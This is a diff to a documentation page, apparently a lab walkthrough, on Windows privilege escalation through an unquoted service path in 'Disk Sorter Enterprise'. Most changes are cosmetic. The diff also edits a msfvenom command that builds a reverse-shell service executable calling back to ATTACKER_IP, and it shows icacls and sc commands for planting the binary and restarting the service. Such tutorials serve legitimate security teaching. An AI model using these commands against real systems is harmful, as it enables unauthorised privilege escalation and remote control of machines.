@@ -9,9 +9,9 @@ sidebar_position: 3
 
 ```bash
                        # Quoted #                                                      # Unquoted #
-+--------------------------------------------------------+      +------------------------------------------------------+
-| "C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe" | -->> | C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |
-+--------------------------------------------------------+      +------------------------------------------------------+
+┌────────────────────────────────────────────────────────┐    ┌──────────────────────────────────────────────────────┐
+| "C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe" | -► | C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |
+└────────────────────────────────────────────────────────┘    └──────────────────────────────────────────────────────┘
 ```
 
 <br/>
@@ -29,7 +29,7 @@ When the `SCM` **(Service Control Manager)** tries to Execute the Binary, a prob
 C:\> sc qc "Disk Sorter Enterprise"
 [SC] QueryServiceConfig SUCCESS
 
-SERVICE_NAME: disk sorter enterprise
+SERVICE_NAME: Disk Sorter Enterprise
         TYPE               : 10  WIN32_OWN_PROCESS
         START_TYPE         : 2   AUTO_START
         ERROR_CONTROL      : 0   IGNORE
@@ -46,7 +46,7 @@ SERVICE_NAME: disk sorter enterprise
 - The <b style={{ color: 'DeepSkyBlue' }}>BUILTIN\\Users:(WD)(AD)</b> has the Ability to <span style={{fontWeight: 'Bold'}}>Append - Write Data.</span>
 
 ```log
-C:\>icacls c:\MyPrograms
+C:\> icacls C:\MyPrograms
 C:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
               BUILTIN\Administrators:(I)(OI)(CI)(F)
               BUILTIN\Users:(I)(OI)(CI)(RX)
@@ -59,9 +59,8 @@ C:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
 
 - Generating and Transfering the **PAYLOAD**
 
-```bash
-attacker@machine:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc.exe
-attacker@machine:~$ nc -lvp 4446
+```js
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o rev-svc.exe
 ```
 
 <br/>
@@ -80,8 +79,8 @@ C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
 - Restarting the <b style={{ color: 'MediumTurquoise' }}>Disk Sorter Enerprise</b> Service. 
 
 ```log
-C:\> sc stop "disk sorter enterprise"
-C:\> sc start "disk sorter enterprise"
+C:\> sc stop  "Disk Sorter Enterprise"
+C:\> sc start "Disk Sorter Enterprise"
 ```
 
 ```bash
